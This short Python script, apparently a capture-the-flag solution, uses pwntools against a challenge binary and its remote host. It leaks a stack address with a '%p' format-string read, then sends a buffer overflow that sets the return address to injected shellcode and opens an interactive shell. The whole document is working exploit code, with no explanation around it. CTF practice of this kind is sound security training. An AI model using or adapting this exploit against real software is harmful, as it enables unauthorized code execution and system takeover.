from pwn import *

elf = context.binary = ELF('./all')

p = process('./all')
#gdb.attach(p, 'b *vuln+66\nb *vuln+73\ncontinue\n')
p = remote('all.chal.cyberjousting.com', 1348)


#Leaking Address of Local Variable
payload = b'%p'
p.sendline(payload)
var = int(p.recvuntil(b'\n').strip(), 16)
log.info("Variable Address = {}".format(hex(var)))

#shellcode payload
payload = b'quit\x00' + b'A'*35 + p64(var+48) + asm(shellcraft.sh())
p.sendline(payload)
p.interactive()